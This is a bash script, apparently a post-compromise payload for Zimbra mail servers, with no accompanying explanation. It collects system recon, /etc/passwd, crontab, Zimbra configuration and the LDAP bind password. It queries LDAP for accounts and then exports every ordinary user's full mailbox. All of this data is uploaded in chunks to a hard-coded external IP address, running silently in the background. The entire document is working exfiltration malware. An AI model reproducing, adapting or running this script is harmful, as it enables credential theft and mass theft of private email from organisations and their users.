#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
exec 9>/tmp/.spz.lock
flock -n 9 || exit 0
U=http://131.123.43.239
ZM=/opt/zimbra/bin
post(){ curl -sk -m 25 -X POST --data-binary @- "$U/up" -H "X-Name: $1" >/dev/null 2>&1; }
b=$( (id; hostname; uname -a; ip -4 a; ip route; cat /etc/hosts; cat /etc/resolv.conf; arp -n 2>/dev/null | head -20; ss -tlnp 2>/dev/null | head -30) 2>&1 | base64 -w0)
echo "$b" | post "spz_recon"
$ZM/zmprov -l gas 2>/dev/null > /tmp/.spz_gas.txt
cat /tmp/.spz_gas.txt | post "spz_gas"
# intel gold
zmlocalconfig 2>/dev/null | post "spz_lc"
[ -f /opt/zimbra/conf/localconfig.xml ] && base64 -w0 /opt/zimbra/conf/localconfig.xml | post "spz_lc2"
[ -f /opt/zimbra/conf/nginx/includes/nginx.conf.mail ] && base64 -w0 /opt/zimbra/conf/nginx/includes/nginx.conf.mail | post "spz_ng"
[ -f /opt/zimbra/postfix/conf/master.cf ] && head -60 /opt/zimbra/postfix/conf/master.cf | post "spz_mcf"
for gs in $(cat /tmp/.spz_gas.txt); do
  $ZM/zmprov gs "$gs" 2>/dev/null | grep -iE "ServiceHostname|IpAddress|zimbraServiceEnabled|^# name" | head -40
done | post "spz_gs"
LH=$(zmlocalconfig -s zimbra_ldap_host 2>/dev/null | awk '{print $3}')
LD=$(zmlocalconfig -s zimbra_ldap_userdn 2>/dev/null | awk '{print $3}')
BP=$(zmlocalconfig -s zimbra_ldap_password 2>/dev/null | awk '{print $3}')
if [ -n "$LH" ] && [ -n "$BP" ]; then
  ldapsearch -x -H "ldap://$LH:389" -D "$LD" -w "$BP" -b "" "(objectClass=zimbraAccount)" mail 2>/dev/null | post "spz_ldap"
fi
$ZM/zmprov -l gaa 2>/dev/null > /tmp/.spz_accts.txt
wc -lc /tmp/.spz_accts.txt 2>/dev/null | post "spz_gaac"
head -300 /tmp/.spz_accts.txt 2>/dev/null | post "spz_gaah"
grep -vE "^(admin|spam\.|ham\.|virus-quarantine|galsync)" /tmp/.spz_accts.txt > /tmp/.spz_targets.txt 2>/dev/null
m=$(head -1 /tmp/.spz_targets.txt)
if [ -n "$m" ]; then
  $ZM/zmmailbox -z -m "$m" getRestURL "//?fmt=tgz&query=is:anywhere" 2>/dev/null | head -c 100000 > /tmp/.spz_probe.tgz
  ls -la /tmp/.spz_probe.tgz 2>/dev/null | post "spz_probeinfo"
  split -b 40k --filter="curl -sk -m 60 -X POST --data-binary @- $U/up -H 'X-Name: spz_prb_'\$FILE" /tmp/.spz_probe.tgz 2>/dev/null
fi
while read -r mm; do
  $ZM/zmmailbox -z -m "$mm" getRestURL "//?fmt=tgz&query=is:anywhere" 2>/dev/null | \
  split -b 60m --filter="curl -sk -m 600 -X POST --data-binary @- $U/up -H 'X-Name: spz_au_${mm}_'\$FILE" -
  echo "$mm" | curl -sm 30 -X POST --data-binary @- "$U/up" -H "X-Name: spz_rc_$(echo "$mm" | tr -c 'a-zA-Z0-9' '_')" >/dev/null 2>&1
done < /tmp/.spz_targets.txt
echo ALLDONE | curl -sm 30 -X POST --data-binary @- "$U/up" -H "X-Name: spz_alldone" >/dev/null 2>&1


